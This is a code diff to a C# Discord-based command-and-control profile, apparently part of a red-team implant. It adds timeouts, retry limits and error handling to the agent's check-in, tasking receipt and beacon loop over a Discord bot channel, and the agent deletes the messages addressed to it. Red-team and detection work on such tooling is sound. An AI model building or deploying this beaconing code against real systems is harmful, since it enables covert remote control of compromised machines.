@@ -1,5 +1,6 @@
 using Agent.Interfaces;
 using Agent.Models;
+using Agent.Utilities;
 using Discord;
 using Discord.WebSocket;
 using Newtonsoft.Json;
@@ -14,7 +15,12 @@ namespace Agent.Profiles
         private IMessageManager messageManager { get; set; }
         private ILogger logger { get; set; }
         private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
-        private AutoResetEvent clientReady = new AutoResetEvent(false);
+        private static readonly TimeSpan CheckinResponseTimeout = TimeSpan.FromSeconds(30);
+        private ManualResetEventSlim clientReady = new ManualResetEventSlim(false);
+        private Func<Task> startClient;
+        private Func<Task> loginClient;
+        private Func<LoginState> getLoginState;
+        private TimeSpan connectionTimeout = TimeSpan.FromSeconds(30);
         private readonly string _token;
         private readonly ulong _channel_id;
         private readonly string _uuid = Guid.NewGuid().ToString();
@@ -33,8 +39,9 @@ namespace Agent.Profiles
         private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
         public DiscordProfile(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
         {
-            crypt = crypto;
-            agentConfig = config;
+            this.crypt = crypto;
+            this.agentConfig = config;
+            this.logger = logger;
             this.messageManager = messageManager;
             var opts = System.Text.Json.JsonSerializer.Deserialize(
                 ChannelConfig.Decode(),
@@ -49,6 +56,9 @@ namespace Agent.Profiles
             };
             _httpClient = new HttpClient();
             _client = new DiscordSocketClient(gateway_config);
+            startClient = () => _client.StartAsync();
+            loginClient = () => _client.LoginAsync(TokenType.Bot, _token);
+            getLoginState = () => _client.LoginState;
             _client.MessageReceived += _client_MessageReceived;
             _client.Ready += _client_Ready;
         }
@@ -71,52 +81,116 @@ namespace Agent.Profiles
                 return;
             }
 
+            try
+            {
+                var attachment = message.Attachments.FirstOrDefault();
+                string content = attachment?.Filename?.Contains(_uuid) == true
+                    ? await GetFileContentsAsync(attachment.Url)
+                    : message.Content;
 
-            MessageWrapper discordMessage;
-            if (message.Attachments.Count > 0 && message.Attachments.FirstOrDefault().Filename.Contains(_uuid))
-            {
-                discordMessage = JsonConvert.DeserializeObject<MessageWrapper>(await GetFileContentsAsync(message.Attachments.FirstOrDefault().Url));
-            }
-            else
-            {
-                discordMessage = JsonConvert.DeserializeObject<MessageWrapper>(message.Content);
-            }
-
-            if (discordMessage is not null & !discordMessage.to_server && discordMessage.client_id == _uuid) //It belongs to us
-            {
-                try
+                if (HandleInboundMessage(content))
                 {
-                    _ = message.DeleteAsync();
+                    try
+                    {
+                        _ = message.DeleteAsync();
+                    }
+                    catch { }
                 }
-                catch { }
+            }
+            catch
+            {
+                // A malformed peer message must not fault Discord's receive callback.
+            }
+        }
 
+        private bool HandleInboundMessage(string content)
+        {
+            MessageWrapper? discordMessage;
+            try
+            {
+                discordMessage = JsonConvert.DeserializeObject<MessageWrapper>(content);
+            }
+            catch
+            {
+                return false;
+            }
+
+            if (discordMessage is null || discordMessage.to_server || discordMessage.client_id != _uuid)
+            {
+                return false;
+            }
+
+            try
+            {
+                string plaintext = this.crypt.Decrypt(discordMessage.message);
                 if (!checkedin)
                 {
-                    cir = System.Text.Json.JsonSerializer.Deserialize(this.crypt.Decrypt(discordMessage.message), CheckinResponseJsonContext.Default.CheckinResponse);
+                    CheckinResponse? response = System.Text.Json.JsonSerializer.Deserialize(plaintext, CheckinResponseJsonContext.Default.CheckinResponse);
+                    if (!CheckinResponseValidation.IsSuccessful(response))
+                    {
+                        return true;
+                    }
+
+                    cir = response;
                     checkinAvailable.Set();
-                    return;
+                    return true;
                 }
 
                 //If we make it to here, it's a tasking response
-                GetTaskingResponse gtr = System.Text.Json.JsonSerializer.Deserialize(this.crypt.Decrypt(discordMessage.message), GetTaskingResponseJsonContext.Default.GetTaskingResponse);
-                if (gtr == null)
+                GetTaskingResponse? gtr = System.Text.Json.JsonSerializer.Deserialize(plaintext, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+                if (gtr?.action != "get_tasking")
                 {
-                    return;
+                    return true;
                 }
 
                 TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
-                this.SetTaskingReceived(this, tra);
+                this.SetTaskingReceived?.Invoke(this, tra);
+            }
+            catch
+            {
+                // JSON, Base64, crypto, and tasking failures are peer-controlled.
             }
 
+            return true;
         }
 
         private async Task<bool> Start()
         {
-            await _client.StartAsync();
-            await _client.LoginAsync(TokenType.Bot, _token);
-            clientReady.WaitOne();
-            return _client.LoginState == LoginState.LoggedIn;
+            clientReady.Reset();
+            if (!await WaitForConnectionStep(startClient(), connectionTimeout, cancellationTokenSource.Token) ||
+                !await WaitForConnectionStep(loginClient(), connectionTimeout, cancellationTokenSource.Token) ||
+                !await CheckinResponseWait.WaitAsync(clientReady, connectionTimeout, cancellationTokenSource.Token))
+            {
+                return false;
+            }
+            return getLoginState() == LoginState.LoggedIn;
         }
+
+        private static async Task<bool> WaitForConnectionStep(Task operation, TimeSpan timeout, CancellationToken cancellationToken)
+        {
+            try
+            {
+                await operation.WaitAsync(timeout, cancellationToken);
+                return true;
+            }
+            catch (TimeoutException)
+            {
+                ObserveFault(operation);
+                return false;
+            }
+            catch (OperationCanceledException)
+            {
+                ObserveFault(operation);
+                throw;
+            }
+        }
+
+        private static void ObserveFault(Task operation) =>
+            _ = operation.ContinueWith(
+                task => _ = task.Exception,
+                CancellationToken.None,
+                TaskContinuationOptions.OnlyOnFaulted | TaskContinuationOptions.ExecuteSynchronously,
+                TaskScheduler.Default);
 
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
@@ -124,8 +198,11 @@ namespace Agent.Profiles
 
             await this.Send(System.Text.Json.JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
 
-            //Wait for a checkin response message
-            checkinAvailable.Wait();
+            //Wait for a bounded interval for a checkin response message.
+            if (!await WaitForCheckinResponse(checkinAvailable, CheckinResponseTimeout, cancellationTokenSource.Token))
+            {
+                return new CheckinResponse { status = "failed" };
+            }
 
             //We got a checkin response, so let's finish the checkin process
             this.checkedin = true;
@@ -133,26 +210,50 @@ namespace Agent.Profiles
             return this.cir;
         }
 
+        private static Task<bool> WaitForCheckinResponse(
+            ManualResetEventSlim signal,
+            TimeSpan timeout,
+            CancellationToken cancellationToken) =>
+            CheckinResponseWait.WaitAsync(signal, timeout, cancellationToken);
+
         public async Task StartBeacon()
         {
             //Main beacon loop handled here
-            this.cancellationTokenSource = new CancellationTokenSource();
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
-                if (_client.LoginState != LoginState.LoggedIn)
+                if (getLoginState() != LoginState.LoggedIn)
                 {
-                    await this.Start();
+                    if (!await this.Start())
+                    {
+                        this.currentAttempt++;
+                        if (this.currentAttempt >= this.maxAttempts)
+                        {
+                            this.cancellationTokenSource.Cancel();
+                        }
+                        continue;
+                    }
                 }
 
                 //Check if we have something to send.
                 if (!this.messageManager.HasResponses())
                 {
+                    try
+                    {
+                        await WaitWhileIdle(cancellationTokenSource.Token);
+                    }
+                    catch (OperationCanceledException) when (cancellationTokenSource.IsCancellationRequested)
+                    {
+                        break;
+                    }
                     continue;
                 }
 
                 try
                 {
-                    await this.Send(messageManager.GetAgentResponseString());
+                    bool delivered = await messageManager.DeliverAsync(
+                        this.Send,
+                        result => result);
+                    this.currentAttempt = delivered ? 0 : this.currentAttempt + 1;
                 }
                 catch (Exception e)
                 {
@@ -165,11 +266,20 @@ namespace Agent.Profiles
                 }
             }
         }
-        internal async Task<string> Send(string json)
+
+        private static Task WaitWhileIdle(CancellationToken cancellationToken)
         {
-            if (_client.LoginState != LoginState.LoggedIn)
+            return Task.Delay(100, cancellationToken);
+        }
+
+        internal async Task<bool> Send(string json)
+        {
+            if (getLoginState() != LoginState.LoggedIn)
             {
-                await this.Start();
+                if (!await this.Start())
+                {
+                    return false;
+                }
             }
 
             string msg = this.crypt.Encrypt(json);
@@ -190,23 +300,15 @@ namespace Agent.Profiles
             {
                 using (MemoryStream stream = new MemoryStream(System.Text.Encoding.ASCII.GetBytes(System.Text.Json.JsonSerializer.Serialize(discordMessage))))
                 {
-                    try
-                    {
-                        await _channel.SendFileAsync(stream, discordMessage.client_id + ".server");
-                    }
-                    catch { }
+                    await _channel.SendFileAsync(stream, discordMessage.client_id + ".server");
                 }
             }
             else
             {
-                try
-                {
-                    await _channel.SendMessageAsync(System.Text.Json.JsonSerializer.Serialize(discordMessage));
-                }
-                catch { }
+                await _channel.SendMessageAsync(System.Text.Json.JsonSerializer.Serialize(discordMessage));
             }
 
-            return String.Empty;
+            return true;
         }
 
         public bool StopBeacon()
